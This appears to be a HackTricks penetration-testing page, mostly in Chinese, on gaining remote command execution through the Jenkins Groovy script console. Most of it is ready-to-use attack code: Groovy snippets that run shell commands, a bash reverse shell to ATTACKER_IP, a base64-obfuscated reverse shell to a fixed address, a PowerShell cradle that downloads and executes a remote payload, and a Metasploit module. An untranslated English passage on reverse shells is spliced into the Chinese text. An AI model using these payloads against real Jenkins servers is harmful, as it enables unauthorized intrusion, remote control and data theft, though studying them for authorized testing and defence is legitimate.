# Jenkins使用Groovy脚本进行远程命令执行（RCE）

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## Jenkins使用Groovy脚本进行远程命令执行（RCE）

这比在Jenkins中创建一个新项目要更简洁。

1. 转到 _path\_jenkins/script_
2. 在文本框中输入脚本
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
您可以使用以下方式执行命令：`cmd.exe /c dir`

在**Linux**中，您可以执行以下操作：**`"ls /".execute().text`**

如果您需要在文本中使用_引号_和_单引号_，您可以使用_"""PAYLOAD"""_（三个双引号）来执行有效载荷。

**另一个有用的Groovy脚本**是（替换\[插入命令]）：
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### 在Linux中的反向Shell

A reverse shell is a technique used in penetration testing to gain remote access to a target machine. It involves establishing a connection from the target machine to the attacker's machine, allowing the attacker to execute commands on the target machine.

To create a reverse shell in Linux, you can use the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.

This command redirects the input and output of the bash shell to a TCP connection established with the attacker's machine. It effectively creates a reverse shell, allowing the attacker to interact with the target machine's command line.

Once the reverse shell is established, the attacker can execute commands on the target machine as if they were physically present. This can be used to perform various actions, such as exploring the file system, running privilege escalation exploits, or exfiltrating sensitive data.

It's important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used in controlled environments for legitimate purposes, such as penetration testing or network administration.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### 在Windows中的反向Shell

您可以准备一个带有PowerShell反向Shell的HTTP服务器，并使用Jenkins下载并执行它：
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### 脚本

您可以使用[**此脚本**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py)自动化此过程。

您可以使用MSF获取反向shell：
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想看到您的公司在 HackTricks 中被广告，或者如果您想访问最新版本的 PEASS 或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注** 我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来 **分享您的黑客技巧**。

</details>
